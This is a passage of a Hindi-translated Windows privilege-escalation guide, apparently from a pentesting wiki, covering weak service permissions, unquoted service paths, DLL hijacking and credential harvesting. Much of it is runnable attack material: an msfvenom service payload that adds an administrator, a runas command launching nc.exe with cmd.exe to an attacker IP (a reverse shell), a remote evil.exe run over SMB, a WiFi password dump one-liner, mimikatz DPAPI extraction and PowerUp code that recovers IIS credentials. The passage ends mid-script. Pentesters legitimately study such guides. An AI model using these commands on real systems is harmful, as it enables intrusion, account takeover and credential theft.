for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विसेज रजिस्ट्री मॉडिफाई परमिशन्स

आपको यह जांचना चाहिए कि क्या आप किसी सर्विस रजिस्ट्री को मॉडिफाई कर सकते हैं।\
आप एक सर्विस **रजिस्ट्री** पर अपनी **परमिशन्स** की **जांच** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचें कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** को FullControl प्राप्त है। यदि ऐसा है, तो आप सेवा द्वारा निष्पादित किए जाने वाले बाइनरी को बदल सकते हैं।

बाइनरी के पथ को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### सेवाओं के रजिस्ट्री AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास किसी रजिस्ट्री पर यह अनुमति है, इसका मतलब है **आप इस रजिस्ट्री से उप-रजिस्ट्री बना सकते हैं**। विंडोज सेवाओं के मामले में यह **मनमाने कोड को निष्पादित करने के लिए पर्याप्त है:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### अनुद्धृत सेवा पथ

यदि किसी निष्पादन योग्य फ़ाइल का पथ उद्धरण चिह्नों के अंदर नहीं है, तो विंडोज हर अंतराल से पहले के सभी पथों को निष्पादित करने का प्रयास करेगा।

उदाहरण के लिए, पथ _C:\Program Files\Some Folder\Service.exe_ के लिए विंडोज कोशिश करेगा निष्पादित करने की:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी अनुद्धृत सेवा पथों की सूची बनाने के लिए (बिल्ट-इन विंडोज सेवाओं को छोड़कर)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस कमजोरी का पता लगा सकते हैं और इसका शोषण कर सकते हैं** metasploit के साथ: _exploit/windows/local/trusted_service_path_\
आप metasploit के साथ मैन्युअली एक सर्विस बाइनरी बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### पुनर्प्राप्ति क्रियाएँ

यह संभव है कि Windows को निर्देशित किया जा सके कि जब कोई सेवा क्रियान्वित करते समय विफल हो जाए तो वह क्या करे। यदि वह सेटिंग किसी बाइनरी की ओर इशारा कर रही है और इस बाइनरी को अधिलेखित किया जा सकता है तो आपको विशेषाधिकार बढ़ाने में सक्षम हो सकते हैं।

## अनुप्रयोग

### स्थापित अनुप्रयोग

**बाइनरीज की अनुमतियाँ** जांचें (शायद आप एक को अधिलेखित कर सकते हैं और विशेषाधिकार बढ़ा सकते हैं) और **फोल्डर्स** की भी ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जांचें कि क्या आप किसी विशेष फ़ाइल को पढ़ने के लिए कुछ कॉन्फ़िग फ़ाइल को संशोधित कर सकते हैं या यदि आप किसी ऐसे बाइनरी को संशोधित कर सकते हैं जिसे Administrator खाते द्वारा निष्पादित किया जाने वाला है (schedtasks).

सिस्टम में कमजोर फ़ोल्डर/फ़ाइलों की अनुमतियों को खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएं

**जांचें कि क्या आप कुछ रजिस्ट्री या बाइनरी को ओवरराइट कर सकते हैं जो एक अलग यूजर द्वारा निष्पादित की जाने वाली है।**\
**निम्नलिखित पृष्ठ** को पढ़ें ताकि आप अधिक जान सकें कि अधिकार बढ़ाने के लिए दिलचस्प **ऑटोरन स्थानों** के बारे में:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ड्राइवर्स

संभावित **तृतीय पक्ष के अजीब/कमजोर** ड्राइवर्स की तलाश करें
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL हाइजैकिंग

यदि आपके पास **PATH पर मौजूद किसी फोल्डर के अंदर लिखने की अनुमति है** तो आप किसी प्रक्रिया द्वारा लोड की गई DLL को हाइजैक कर सकते हैं और **अधिकार बढ़ा सकते हैं**।

PATH के अंदर सभी फोल्डर्स की अनुमतियाँ जाँचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग कैसे करें, इसके बारे में अधिक जानकारी के लिए:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## नेटवर्क

### शेयर्स
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts फ़ाइल

hosts फ़ाइल पर हार्डकोडेड अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट्स

**प्रतिबंधित सेवाओं** की जाँच करें जो बाहर से हैं
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित आदेशों के लिए यह पृष्ठ देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची, नियम बनाना, बंद करना, बंद करना...)**

और [नेटवर्क गणना के लिए आदेश यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` यह भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है।

यदि आपको रूट यूजर मिल जाता है, तो आप किसी भी पोर्ट पर सुन सकते हैं (पहली बार जब आप `nc.exe` का उपयोग करके किसी पोर्ट पर सुनने के लिए करते हैं, तो यह GUI के माध्यम से पूछेगा कि क्या `nc` को फ़ायरवॉल द्वारा अनुमति दी जानी चाहिए)।
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
आसानी से बैश को रूट के रूप में शुरू करने के लिए, आप `--default-user root` का प्रयास कर सकते हैं

आप `WSL` फाइलसिस्टम को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फोल्डर में एक्सप्लोर कर सकते हैं

## Windows प्रमाण-पत्र

### Winlogon प्रमाण-पत्र
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल्स मैनेजर / विंडोज वॉल्ट

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) से\
विंडोज वॉल्ट सर्वर, वेबसाइट और अन्य प्रोग्राम के लिए उपयोगकर्ता क्रेडेंशियल्स संग्रहीत करता है जिसे **विंडोज** **स्वचालित रूप से लॉग इन कर सकता है**। पहली नजर में, ऐसा लग सकता है कि अब उपयोगकर्ता अपने फेसबुक क्रेडेंशियल्स, ट्विटर क्रेडेंशियल्स, जीमेल क्रेडेंशियल्स आदि को संग्रहीत कर सकते हैं, ताकि वे ब्राउज़र के माध्यम से स्वचालित रूप से लॉग इन कर सकें। लेकिन ऐसा नहीं है।

विंडोज वॉल्ट ऐसे क्रेडेंशियल्स संग्रहीत करता है जिसे विंडोज स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **विंडोज एप्लिकेशन जिसे किसी संसाधन** (सर्वर या वेबसाइट) **तक पहुँचने के लिए क्रेडेंशियल्स की आवश्यकता होती है** **इस क्रेडेंशियल मैनेजर** और विंडोज वॉल्ट का उपयोग कर सकता है और हर बार उपयोगकर्ता द्वारा यूजरनेम और पासवर्ड दर्ज करने के बजाय संग्रहीत क्रेडेंशियल्स का उपयोग कर सकता है।

जब तक एप्लिकेशन क्रेडेंशियल मैनेजर के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि उनके लिए किसी दिए गए संसाधन के लिए क्रेडेंशियल्स का उपयोग करना संभव है। इसलिए, अगर आपका एप्लिकेशन वॉल्ट का उपयोग करना चाहता है, तो उसे किसी तरह **क्रेडेंशियल मैनेजर के साथ संवाद करना चाहिए और उस संसाधन के लिए क्रेडेंशियल्स का अनुरोध करना चाहिए** डिफ़ॉल्ट स्टोरेज वॉल्ट से।

मशीन पर संग्रहीत क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
तब आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` का उपयोग `/savecred` विकल्प के साथ कर सकते हैं। निम्नलिखित उदाहरण एक SMB शेयर के माध्यम से एक दूरस्थ बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` का उपयोग दिए गए क्रेडेंशियल सेट के साथ करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
### DPAPI

सिद्धांत रूप में, डेटा प्रोटेक्शन API किसी भी प्रकार के डेटा के सममित एन्क्रिप्शन को सक्षम कर सकता है; व्यवहार में, इसका प्राथमिक उपयोग Windows ऑपरेटिंग सिस्टम में असममित निजी कुंजियों के सममित एन्क्रिप्शन को प्रदर्शन करना है, उपयोगकर्ता या सिस्टम रहस्य का उपयोग करके एंट्रोपी का एक महत्वपूर्ण योगदान के रूप में।

**DPAPI डेवलपर्स को उपयोगकर्ता के लॉगऑन रहस्यों से व्युत्पन्न एक सममित कुंजी का उपयोग करके कुंजियों को एन्क्रिप्ट करने की अनुमति देता है**, या सिस्टम एन्क्रिप्शन के मामले में, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करके।

उपयोगकर्ता की RSA कुंजियों को एन्क्रिप्ट करने के लिए उपयोग की जाने वाली DPAPI कुंजियाँ `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका के अंतर्गत संग्रहीत की जाती हैं, जहाँ {SID} उस उपयोगकर्ता का [सिक्योरिटी आइडेंटिफायर](https://en.wikipedia.org/wiki/Security\_Identifier) है। **DPAPI कुंजी उसी फ़ाइल में संग्रहीत की जाती है जैसे कि मास्टर कुंजी जो उपयोगकर्ताओं की निजी कुंजियों की रक्षा करती है**। यह आमतौर पर 64 बाइट्स का यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका सुरक्षित है इसलिए आप cmd से `dir` का उपयोग करके इसे सूचीबद्ध नहीं कर सकते, लेकिन आप PS से इसे सूचीबद्ध कर सकते हैं)।
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz मॉड्यूल** `dpapi::masterkey` को उचित तर्कों (`/pvk` या `/rpc`) के साथ उपयोग कर सकते हैं इसे डिक्रिप्ट करने के लिए।

**मास्टर पासवर्ड द्वारा सुरक्षित क्रेडेंशियल्स फाइलें** आमतौर पर यहाँ स्थित होती हैं:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` का उपयोग कर सकते हैं उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए।
आप **कई DPAPI** **masterkeys** को **मेमोरी** से `sekurlsa::dpapi` मॉड्यूल के साथ निकाल सकते हैं (यदि आप रूट हैं)।

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

**PowerShell credentials** अक्सर **स्क्रिप्टिंग** और ऑटोमेशन कार्यों के लिए उपयोग किए जाते हैं जैसे कि एन्क्रिप्टेड क्रेडेंशियल्स को सुविधाजनक रूप से स्टोर करने का एक तरीका। क्रेडेंशियल्स **DPAPI** का उपयोग करके सुरक्षित किए जाते हैं, जो आमतौर पर यह मतलब होता है कि उन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जिस पर वे बनाए गए थे।

फाइल से PS क्रेडेंशियल्स को **डिक्रिप्ट** करने के लिए आप कर सकते हैं:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाईफाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड्स
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
### Mimikatz का उपयोग करें

**Mimikatz** `dpapi::rdg` मॉड्यूल का उपयोग करें उचित `/masterkey` के साथ **.rdg फाइलों को डिक्रिप्ट करने के लिए**\
आप Mimikatz `sekurlsa::dpapi` मॉड्यूल के साथ मेमोरी से **कई DPAPI मास्टरकीज़ निकाल सकते हैं**

### Sticky Notes

लोग अक्सर Windows कार्यस्थानों पर StickyNotes ऐप का उपयोग **पासवर्ड सहेजने** और अन्य जानकारी के लिए करते हैं, यह न समझते हुए कि यह एक डेटाबेस फाइल है। यह फाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में स्थित है और इसे खोजने और जांचने के लिए हमेशा मूल्यवान होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड पुनर्प्राप्त करने के लिए आपको एडमिनिस्ट्रेटर होना चाहिए और एक High Integrity स्तर के तहत चलाना चाहिए।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` डायरेक्टरी में स्थित है।\
अगर यह फाइल मौजूद है तो संभव है कि कुछ **क्रेडेंशियल्स** कॉन्फ़िगर किए गए हों और उन्हें **पुनर्प्राप्त** किया जा सकता है।

यह कोड _**PowerUP**_ से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
इंस्टालर्स **SYSTEM विशेषाधिकारों के साथ चलाए जाते हैं**, कई **DLL Sideloading के लिए संवेदनशील होते हैं (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)** से).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फाइलें और रजिस्ट्री (क्रेडेंशियल्स)

### Putty क्रेड्स
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कीज
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH कुंजियाँ

SSH निजी कुंजियाँ रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत की जा सकती हैं, इसलिए आपको जांचना चाहिए कि क्या वहाँ कुछ दिलचस्प है:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
यदि आपको उस पथ के अंदर कोई प्रविष्टि मिलती है, तो वह संभवतः एक सहेजा गया SSH कुंजी होगी। यह एन्क्रिप्टेड रूप में संग्रहीत होती है लेकिन [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) का उपयोग करके आसानी से डिक्रिप्ट की जा सकती है।\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चालू नहीं है और आप चाहते हैं कि यह स्वचालित रूप से बूट पर शुरू हो, तो चलाएं:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh कुंजियाँ बनाने की कोशिश की, उन्हें `ssh-add` के साथ जोड़ा और एक मशीन पर ssh के माध्यम से लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने असममित कुंजी प्रमाणीकरण के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।
{% endhint %}

### अनटेंडेड फाइल्स
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum\_unattend_

उदाहरण सामग्री\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM और SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नामक फ़ाइल की खोज करें।

### Cached GPP Password

KB2928120 (MS14-025 देखें) से पहले, कुछ Group Policy Preferences को कस्टम अकाउंट के साथ कॉन्फ़िगर किया जा सकता था। इस सुविधा का मुख्य उपयोग मशीनों के एक समूह पर कस्टम लोकल एडमिनिस्ट्रेटर अकाउंट को डिप्लॉय करने के लिए किया जाता था। हालांकि, इस दृष्टिकोण के साथ दो समस्याएं थीं। पहली, चूंकि Group Policy Objects को SYSVOL में XML फ़ाइलों के रूप में संग्रहीत किया जाता है, कोई भी डोमेन उपयोगकर्ता उन्हें पढ़ सकता है। दूसरी समस्या यह है कि इन GPPs में सेट किया गया पासवर्ड AES256-एन्क्रिप्टेड होता है एक डिफ़ॉल्ट कुंजी के साथ, जो सार्वजनिक रूप से दस्तावेज़ीकृत है। इसका मतलब है कि कोई भी प्रमाणित उपयोगकर्ता संवेदनशील डेटा तक पहुंच सकता है और अपनी मशीन या यहां तक कि डोमेन पर अपने विशेषाधिकारों को बढ़ा सकता है। यह फ़ंक्शन जांच करेगा कि क्या कोई स्थानीय रूप से कैश्ड GPP फ़ाइल में "cpassword" फ़ील्ड खाली नहीं है। यदि हां, तो यह इसे डिक्रिप्ट करेगा और GPP के बारे में कुछ जानकारी के साथ एक कस्टम PS ऑब्जेक्ट लौटाएगा जिसमें फ़ाइल का स्थान भी शामिल है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
```markdown
crackmapexec का उपयोग करके पासवर्ड प्राप्त करना:
```
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
वेब.config में क्रेडेंशियल्स का उदाहरण:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN प्रमाणपत्र
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

